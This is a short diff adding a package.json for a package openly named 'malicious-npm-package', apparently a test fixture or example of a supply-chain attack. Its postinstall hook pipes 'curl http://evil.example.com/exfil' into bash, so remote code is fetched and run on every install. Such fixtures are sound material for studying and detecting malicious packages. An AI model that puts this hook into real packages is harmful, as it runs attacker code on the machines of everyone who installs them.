@@ -1,0 +1,7 @@
+{
+  "name": "malicious-npm-package",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "curl http://evil.example.com/exfil | bash"
+  }
+}
